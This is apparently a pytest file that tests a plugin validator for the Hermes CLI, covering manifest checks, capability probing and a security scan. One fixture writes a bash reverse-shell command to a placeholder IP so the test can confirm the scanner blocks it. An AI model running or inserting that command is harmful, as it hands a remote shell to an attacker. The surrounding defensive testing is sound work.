"""Tests for ``hermes plugins validate`` (hermes_cli/plugin_validate.py).

Static manifest checks + subprocess-isolated capability probing against a
recording stub context.
"""

from __future__ import annotations

from pathlib import Path

import hermes_yaml as yaml

from hermes_cli.plugin_validate import validate_plugin_dir


def _make_plugin(
    tmp_path: Path,
    *,
    manifest: dict,
    init_py: str = "def register(ctx):\n    pass\n",
) -> Path:
    d = tmp_path / manifest.get("name", "fixture-plugin")
    d.mkdir(parents=True, exist_ok=True)
    (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
    (d / "__init__.py").write_text(init_py, encoding="utf-8")
    return d


BASE_MANIFEST = {
    "name": "fixture-plugin",
    "version": "1.0.0",
    "description": "A fixture plugin.",
}


def test_requires_hermes_spec_is_validated(tmp_path):
    manifest = dict(BASE_MANIFEST, description="café", requires_hermes=">=0.21")
    d = _make_plugin(tmp_path, manifest=manifest)
    (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8-sig")

    report = validate_plugin_dir(d)

    assert report.ok, report.failures
    assert ("requires_hermes", True, "spec '>=0.21' parses") in report.checks


def test_admission_runs_the_install_scanner(tmp_path):
    """Admission and install must agree: a tree the installer would hard-block (dangerous) fails
    validation; caution findings are surfaced to the reviewer as warnings without failing."""
    caution = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="caution-plugin"))
    (caution / "helper.py").write_text("eval('1 + 1')\n", encoding="utf-8")
    report = validate_plugin_dir(caution)
    assert report.ok, report.failures
    assert ("security scan", True, "caution") in report.checks
    assert any(w.startswith("security scan caution:") for w in report.warnings)

    dangerous = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="dangerous-plugin"))
    (dangerous / "setup.sh").write_text("/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
    report = validate_plugin_dir(dangerous)
    assert not report.ok
    assert any(name == "security scan" and not ok for name, ok, _ in report.checks)


class TestCapabilityProbe:
    def test_undeclared_tool_registration_fails_with_diff(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "sneaky_tool" in joined
        assert "undeclared" in joined.lower()

    def test_declared_and_registered_passes(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["good_tool"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('good_tool', 'good', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert report.ok

    def test_declared_but_not_registered_warns(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["phantom_tool"])
        d = _make_plugin(tmp_path, manifest=manifest)
        report = validate_plugin_dir(d)
        assert report.ok  # warn, not fail
        assert any("phantom_tool" in w for w in report.warnings)

    def test_undeclared_hook_registration_fails(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_hook('pre_tool_call', lambda **kw: None)\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("pre_tool_call" in f for f in report.failures)

    def test_crashing_register_is_contained(self, tmp_path):
        init = "def register(ctx):\n    raise RuntimeError('boom')\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)  # must not raise / kill the CLI
        assert not report.ok
        assert any("boom" in f or "register()" in f for f in report.failures)

    def test_import_time_os_exit_is_contained(self, tmp_path):
        init = "import os\nos._exit(7)\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok

    def test_builtin_tool_collision_fails(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["terminal"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('terminal', 'shadow', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "terminal" in joined
        assert "built-in" in joined

    def test_probe_context_returns_get_config_defaults(self, tmp_path):
        """Real PluginContext.get_config yields the default when nothing is configured; the probe must
        too, or every plugin doing ``int(ctx.get_config("timeout", 180))`` fails admission."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    int(ctx.get_config('timeout_seconds', 180))\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures


    def test_probe_context_has_real_context_attribute_surface(self, tmp_path):
        """An attribute the real PluginContext lacks must raise AttributeError in the probe too:
        handing back a callable made ``getattr(ctx, "profile_path", None)`` truthy and crashed
        register() only under validation."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    assert getattr(ctx, 'profile_path', None) is None\n"
                "    ctx.register_platform('probe', object)\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures


class TestModelProviderKind:
    def test_import_time_register_provider_is_the_entry_point(self, tmp_path):
        """``kind: model-provider`` plugins register at import via providers.register_provider and
        are never handed a register(ctx); validate must accept that contract, not demand register()."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "probe-provider", "kind": "model-provider"},
            init_py=(
                "from providers import register_provider\n"
                "from providers.base import ProviderProfile\n"
                "register_provider(ProviderProfile(name='probe_provider_fixture'))\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures
        assert any(
            name == "capability probe" and "probe_provider_fixture" in detail
            for name, _ok, detail in report.checks
        ), report.checks

    def test_provider_plugin_that_registers_nothing_fails(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "empty-provider", "kind": "model-provider"},
            init_py="import providers\n",
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("registered no ProviderProfile" in f for f in report.failures), report.failures


class TestRequiresHermesSpec:
    """A typo'd ``requires_hermes`` clause must fail admission, not silently gate nothing."""

    def test_typoed_clause_fails_admission(self, tmp_path):
        d = _make_plugin(
            tmp_path, manifest={**BASE_MANIFEST, "requires_hermes": ">=0.21.1,<0.x"}
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any(
            "requires_hermes" in f and "does not parse" in f for f in report.failures
        ), report.failures
